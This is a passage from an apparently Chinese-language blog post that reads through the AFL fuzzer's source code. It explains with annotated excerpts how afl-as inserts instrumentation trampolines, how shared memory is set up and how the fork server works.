class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>** argv)</span> &#123;<br><br>  <span class="hljs-keyword">if</span> (isatty(<span class="hljs-number">2</span>) &amp;&amp; !getenv(<span class="hljs-string">&quot;AFL_QUIET&quot;</span>)) &#123;<br><br>    SAYF(cCYA <span class="hljs-string">&quot;afl-cc &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  &#125; <span class="hljs-keyword">else</span> be_quiet = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (argc &lt; <span class="hljs-number">2</span>) &#123;<br><br>    SAYF(<span class="hljs-string">&quot;\n&quot;</span><br>         <span class="hljs-string">&quot;This is a helper application for afl-fuzz. It serves as a drop-in replacement\n&quot;</span><br>         <span class="hljs-string">&quot;for gcc or clang, letting you recompile third-party code with the required\n&quot;</span><br>         <span class="hljs-string">&quot;runtime instrumentation. A common use pattern would be one of the following:\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;  CC=%s/afl-gcc ./configure\n&quot;</span><br>         <span class="hljs-string">&quot;  CXX=%s/afl-g++ ./configure\n\n&quot;</span><br><br>         <span class="hljs-string">&quot;You can specify custom next-stage toolchain via AFL_CC, AFL_CXX, and AFL_AS.\n&quot;</span><br>         <span class="hljs-string">&quot;Setting AFL_HARDEN enables hardening optimizations in the compiled code.\n\n&quot;</span>,<br>         BIN_PATH, BIN_PATH);<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br><br>  &#125;<br><br>  find_as(argv[<span class="hljs-number">0</span>]);<br><br>  edit_params(argc, argv);<br><br>  execvp(cc_params[<span class="hljs-number">0</span>], (<span class="hljs-type">char</span>**)cc_params);<span class="hljs-comment">//调用以上两个函数，完成配置</span><br><br>  FATAL(<span class="hljs-string">&quot;Oops, failed to execute &#x27;%s&#x27; - check your PATH&quot;</span>, cc_params[<span class="hljs-number">0</span>]);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="afl-as-c"><a href="#afl-as-c" class="headerlink" title="afl-as.c"></a>afl-as.c</h2><p><strong>参数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> u8** as_params;          <span class="hljs-comment">/* Parameters passed to the real &#x27;as&#x27;   */</span> <span class="hljs-comment">// 传给as的参数</span><br><br><span class="hljs-type">static</span> u8*  input_file;         <span class="hljs-comment">/* Originally specified input file      */</span><br><span class="hljs-type">static</span> u8*  modified_file;      <span class="hljs-comment">/* Instrumented file for the real &#x27;as&#x27;  */</span> <span class="hljs-comment">//as进行插桩的文件</span><br><br><span class="hljs-type">static</span> u8   be_quiet,           <span class="hljs-comment">/* Quiet mode (no stderr output)        */</span><br>            clang_mode,         <span class="hljs-comment">/* Running in clang mode?               */</span><br>            pass_thru,          <span class="hljs-comment">/* Just pass data through?              */</span><br>            just_version,       <span class="hljs-comment">/* Just show version?                   */</span><br>            sanitizer;          <span class="hljs-comment">/* Using ASAN / MSAN                    */</span><br><br><span class="hljs-type">static</span> u32  inst_ratio = <span class="hljs-number">100</span>,   <span class="hljs-comment">/* Instrumentation probability (%)      */</span>  <span class="hljs-comment">// 插桩覆盖率</span><br>            as_par_cnt = <span class="hljs-number">1</span>;     <span class="hljs-comment">/* Number of params to &#x27;as&#x27;             */</span><br></code></pre></td></tr></table></figure><p><strong>函数edit_params</strong><br>同afl-gcc中一致，进行参数配置</p><p><strong>函数add_instrumentation</strong><br>插桩函数，此函数负责处理输入文件，生成<code>modified_file</code>，将instrumentations插入所有适当位置。</p><ul><li><p>读取input-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (input_file) &#123;<br><br>    inf = fopen(input_file, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!inf) PFATAL(<span class="hljs-string">&quot;Unable to read &#x27;%s&#x27;&quot;</span>, input_file);<br><br>  &#125; <span class="hljs-keyword">else</span> inf = <span class="hljs-built_in">stdin</span>;<br>  <span class="hljs-comment">//若打开失败，报错无法读取，或直接从stdin读取</span><br></code></pre></td></tr></table></figure></li><li><p>写入modified-file</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">outfd = open(modified_file, O_WRONLY | O_EXCL | O_CREAT, <span class="hljs-number">0600</span>);<br><br><span class="hljs-keyword">if</span> (outfd &lt; <span class="hljs-number">0</span>) PFATAL(<span class="hljs-string">&quot;Unable to write to &#x27;%s&#x27;&quot;</span>, modified_file);<br><br>outf = fdopen(outfd, <span class="hljs-string">&quot;w&quot;</span>);<br><br><span class="hljs-keyword">if</span> (!outf) PFATAL(<span class="hljs-string">&quot;fdopen() failed&quot;</span>); <br></code></pre></td></tr></table></figure><p>接下来看看下一段</p></li></ul><p><strong>真正有趣的地方，插桩逻辑开始之处</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* All right, this is where the actual fun begins. For one, we only want to</span><br><span class="hljs-comment">       instrument the .text section. So, let&#x27;s keep track of that in processed</span><br><span class="hljs-comment">       files - and let&#x27;s set instr_ok accordingly. */</span><br><br>    <span class="hljs-keyword">if</span> (line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; line[<span class="hljs-number">1</span>] == <span class="hljs-string">&#x27;.&#x27;</span>) &#123;<br><br>      <span class="hljs-comment">/* OpenBSD puts jump tables directly inline with the code, which is</span><br><span class="hljs-comment">         a bit annoying. They use a specific format of p2align directives</span><br><span class="hljs-comment">         around them, so we use that as a signal. */</span><br><br>      <span class="hljs-keyword">if</span> (!clang_mode &amp;&amp; instr_ok &amp;&amp; !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;p2align &quot;</span>, <span class="hljs-number">8</span>) &amp;&amp;<br>          <span class="hljs-built_in">isdigit</span>(line[<span class="hljs-number">10</span>]) &amp;&amp; line[<span class="hljs-number">11</span>] == <span class="hljs-string">&#x27;\n&#x27;</span>) skip_next_label = <span class="hljs-number">1</span>;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;text\n&quot;</span>, <span class="hljs-number">5</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t.text&quot;</span>, <span class="hljs-number">13</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t__TEXT,__text&quot;</span>, <span class="hljs-number">21</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section __TEXT,__text&quot;</span>, <span class="hljs-number">21</span>)) &#123;<br>        instr_ok = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">continue</span>; <br>      &#125;<br><br>      <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section\t&quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;section &quot;</span>, <span class="hljs-number">8</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;bss\n&quot;</span>, <span class="hljs-number">4</span>) ||<br>          !<span class="hljs-built_in">strncmp</span>(line + <span class="hljs-number">2</span>, <span class="hljs-string">&quot;data\n&quot;</span>, <span class="hljs-number">5</span>)) &#123;<br>        instr_ok = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>    &#125;<br></code></pre></td></tr></table></figure><ul><li>由于插桩只向<code>.text</code>部分插入，故需要进行该部分的匹配（确认是否在此部分中）</li><li>即匹配<code>text   section\t.text </code>等四个str，若匹配成功，<code>continue</code>跳出，进行下一次循环</li><li>若匹配失败，再与非.text字段进行匹配，若匹配成功，证明不在.text段内，也<code>continue</code>跳出</li><li>上述两种情况，参数<code>instr_ok</code>分别为1、0，即代表是否位于理想字段内。</li></ul><p>后续进行三个判定，来确认一些参数的值。</p><ul><li>插桩时关注的重点是<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">^main:      - function entry point (always <span class="hljs-keyword">instrumented)</span><br><span class="hljs-keyword"></span>         ^.L0:       - GCC <span class="hljs-keyword">branch </span>label<br>         ^.<span class="hljs-keyword">LBB0_0: </span>  - clang <span class="hljs-keyword">branch </span>label (<span class="hljs-keyword">but </span>only in clang mode)<br>         ^\tjnz foo  - conditional <span class="hljs-keyword">branches</span><br></code></pre></td></tr></table></figure>故检测形如<code>\tj[^m]</code>的格式的命令，即为条件跳转命令。当随机数小于覆盖率时，会将<code>trampoline_fmt_64</code>写入<code>R(MAP_SIZE)</code>位进入文件，随后插桩计数<code>ins_lines</code>加一，continue跳出。<br>对于clang，APPLE是相似的过程，即适用于不同编译系统</li></ul><p>最后回到while循环的开始处<br>从刚刚就一直困扰我的问题——判断条件合适（位于.text中），却跳转进下一个循环是为什么，得到了解决。<br>可以看到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (!pass_thru &amp;&amp; !skip_intel &amp;&amp; !skip_app &amp;&amp; !skip_csect &amp;&amp; instr_ok &amp;&amp;<br>        instrument_next &amp;&amp; line[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;\t&#x27;</span> &amp;&amp; <span class="hljs-built_in">isalpha</span>(line[<span class="hljs-number">1</span>])) &#123;<br><br>      <span class="hljs-built_in">fprintf</span>(outf, use_64bit ? trampoline_fmt_64 : trampoline_fmt_32,<br>              R(MAP_SIZE));<br><br>      instrument_next = <span class="hljs-number">0</span>;<br>      ins_lines++;<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>循环开始时便进行了一次条件检测，当合适时，进行插桩，再重新布置参数，使得不漏一处。</p><p><strong>至此，插桩的逻辑基本完成。</strong><br><strong>总结：插桩是通过遍历目标文件行，寻找敏感处并进行标记，于本次循环或下次循环进行插桩，然后再去寻找下处可插处，直至lines遍历完毕</strong></p><h2 id="afl-as-h"><a href="#afl-as-h" class="headerlink" title="afl-as.h"></a>afl-as.h</h2><p>上面读了两个文件中描述了插桩过程的逻辑，其中真正的插桩，<code>trampoline_fmt_64/32</code>是关键所在（插入了什么内容？）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs trampoline_fmt_64/32```定义于```afl-as.h```中，以下是其代码">```c<br>static const u8* trampoline_fmt_32 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (32-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leal -16(%%esp), %%esp\n&quot;<br>  &quot;movl %%edi,  0(%%esp)\n&quot;<br>  &quot;movl %%edx,  4(%%esp)\n&quot;<br>  &quot;movl %%ecx,  8(%%esp)\n&quot;<br>  &quot;movl %%eax, 12(%%esp)\n&quot;<br>  &quot;movl $0x%08x, %%ecx\n&quot;<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movl 12(%%esp), %%eax\n&quot;<br>  &quot;movl  8(%%esp), %%ecx\n&quot;<br>  &quot;movl  4(%%esp), %%edx\n&quot;<br>  &quot;movl  0(%%esp), %%edi\n&quot;<br>  &quot;leal 16(%%esp), %%esp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br><br>static const u8* trampoline_fmt_64 =<br><br>  &quot;\n&quot;<br>  &quot;/* --- AFL TRAMPOLINE (64-BIT) --- */\n&quot;<br>  &quot;\n&quot;<br>  &quot;.align 4\n&quot;<br>  &quot;\n&quot;<br>  &quot;leaq -(128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;movq %%rdx,  0(%%rsp)\n&quot; <br>  &quot;movq %%rcx,  8(%%rsp)\n&quot;<br>  &quot;movq %%rax, 16(%%rsp)\n&quot; // save rdx rcx rax <br>  &quot;movq $0x%08x, %%rcx\n&quot; // set what will be print by fprintf() in rcx<br>  &quot;call __afl_maybe_log\n&quot;<br>  &quot;movq 16(%%rsp), %%rax\n&quot;<br>  &quot;movq  8(%%rsp), %%rcx\n&quot;<br>  &quot;movq  0(%%rsp), %%rdx\n&quot; // 恢复寄存器<br>  &quot;leaq (128+24)(%%rsp), %%rsp\n&quot;<br>  &quot;\n&quot;<br>  &quot;/* --- END --- */\n&quot;<br>  &quot;\n&quot;;<br></code></pre></td></tr></table></figure><p>其中，真正的核心是<code>call __afl_maybe_log</code><br>这个指令来自<code>main_payload_64/32</code><br><strong>__afl_maybe_log</strong><br>其中<code>__afl_maybe_log</code>定义如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_maybe_log:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  lahf\n&quot;</span><br>  <span class="hljs-string">&quot;  seto  %al\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check if SHM region is already mapped. */\n&quot;</span><span class="hljs-comment">//检查共享内存是否进行了设置</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span> <span class="hljs-comment">// 判断__afl_area_ptr是否为null</span><br>  <span class="hljs-string">&quot;  je    __afl_setup\n&quot;</span> <span class="hljs-comment">// 为空则跳转</span><br></code></pre></td></tr></table></figure><p>使用<code>lahf</code>指令，加载状态标志位到<code>AH</code>，即<code>EFLAG</code>寄存器低八位复制到<code>AH</code>中，被复制的标志位包括：符号标志位（SF）、零标志位（ZF）、辅助进位标志位（AF）、奇偶标志位（PF）和进位标志位（CF），使用该指令可以方便地将标志位副本保存在变量中；<br>然后，使用<code>seto %al</code>溢出置位，即<strong>“如果溢出，则%al设置为1”</strong></p><p><strong>__afl_setup</strong><br>用于初始化<code>__afl_area_ptr</code>，且只在运行到第一个桩时进行本次初始化。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Do not retry setup if we had previous failures. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpb $0, __afl_setup_failure(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;  jne __afl_return\n&quot;</span><span class="hljs-comment">//先检查是否为0，不是则直接返回，“防止预先可预见的失败”</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Check out if we have a global pointer on file. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  __afl_global_area_ptr(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rdx, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_first\n&quot;</span> <span class="hljs-comment">// 如果global pointer也为空，进行初次建立</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdx, __afl_area_ptr(%rip)\n&quot;</span><span class="hljs-comment">//否则直接赋值给area ptr，然后进入store</span><br>  <span class="hljs-string">&quot;  jmp  __afl_store\n&quot;</span> <br></code></pre></td></tr></table></figure><p><strong>__afl-setup_first</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-string">&quot;__afl_setup_first:\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Save everything that is not yet saved and that may be touched by\n&quot;</span><br>  <span class="hljs-string">&quot;     getenv() and several other libcalls we&#x27;ll be relying on. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq -352(%rsp), %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax,   0(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rcx,   8(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rdi,  16(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rsi,  32(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r8,   40(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r9,   48(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r10,  56(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %r11,  64(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm0,  96(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm1,  112(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm2,  128(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm3,  144(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm4,  160(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm5,  176(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm6,  192(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm7,  208(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm8,  224(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm9,  240(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm10, 256(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm11, 272(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm12, 288(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm13, 304(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm14, 320(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %xmm15, 336(%rsp)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Map SHM, jumping to __afl_setup_abort if something goes wrong. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* The 64-bit ABI requires 16-byte stack alignment. We&#x27;ll keep the\n&quot;</span><br>  <span class="hljs-string">&quot;     original stack ptr in the callee-saved r12. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  pushq %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rsp, %r12\n&quot;</span><br>  <span class="hljs-string">&quot;  subq  $16, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;  andq  $0xfffffffffffffff0, %rsp\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  leaq .AFL_SHM_ENV(%rip), %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;getenv&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  testq %rax, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je    __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq  %rax, %rdi\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;atoi&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rdx, %rdx   /* shmat flags    */\n&quot;</span><br>  <span class="hljs-string">&quot;  xorq %rsi, %rsi   /* requested addr */\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdi   /* SHM ID         */\n&quot;</span><br>  CALL_L64(<span class="hljs-string">&quot;shmat&quot;</span>)<br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  cmpq $-1, %rax\n&quot;</span><br>  <span class="hljs-string">&quot;  je   __afl_setup_abort\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  /* Store the address of the SHM region. */\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_area_ptr(%rip)\n&quot;</span><br>  <span class="hljs-string">&quot;\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __APPLE__</span><br>  <span class="hljs-string">&quot;  movq %rax, __afl_global_area_ptr(%rip)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>  <span class="hljs-string">&quot;  movq __afl_global_area_ptr@GOTPCREL(%rip), %rdx\n&quot;</span><br>  <span class="hljs-string">&quot;  movq %rax, (%rdx)\n&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span> <span class="hljs-comment">/* ^__APPLE__ */</span></span><br>  <span class="hljs-string">&quot;  movq %rax, %rdx\n&quot;</span><br></code></pre></td></tr></table></figure><p>先将所有寄存器内容进行保存，然后寻找共享内存，如果找不到，就调用<code>__afl_setup_abort</code><br>成功后，调用<code>__afl_forkserver</code><br><strong>__afl_forkserver</strong><br>判断fork server是否成功启动。<br><strong>__afl_fork_wait_loop</strong></p><ul><li>从管道中等待parent的信息，读入<code>__afl_temp</code>内，成功则继续；</li><li>fork一个子进程，子进程执行<code>__afl_fork_resume</code>；</li><li>将子进程pid赋值给<code>__afl_fork_pid</code>，并写入状态管道通知父进程；</li><li>子进程结束后告诉fuzzer，下一轮循环开始。</li></ul><h2 id="afl-fuzz-c"><a href="#afl-fuzz-c" class="headerlink" title="afl-fuzz.c"></a>afl-fuzz.c</h2><p>该文件是afl项目的核心中的核心<br>此文件篇幅过长，选择直接从main函数入口开始看（共8k余行，main位于7706行）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">SAYF(cCYA <span class="hljs-string">&quot;afl-fuzz &quot;</span> cBRI VERSION cRST <span class="hljs-string">&quot; by &lt;lcamtuf@google.com&gt;\n&quot;</span>);<br><br>  doc_path = access(DOC_PATH, F_OK) ? <span class="hljs-string">&quot;docs&quot;</span> : DOC_PATH;<br><br>  gettimeofday(&amp;tv, &amp;tz);<br>  srandom(tv.tv_sec ^ tv.tv_usec ^ getpid());<br></code></pre></td></tr></table></figure><p>感觉是很常见的函数开头，之前读过的几个函数开始也有这几行—-打印版本信息、寻找路径信息、获取时间、获取随机数<br><strong>第一个while循环，进行参数读取</strong><br>随后</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">setup_signal_handlers();<span class="hljs-comment">// 注册信号处理函数。</span><br>  check_asan_opts();<span class="hljs-comment">// 读取环境变量</span><br></code></pre></td></tr></table></figure><p><strong>setup_shm函数</strong><br>该函数用于设置共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 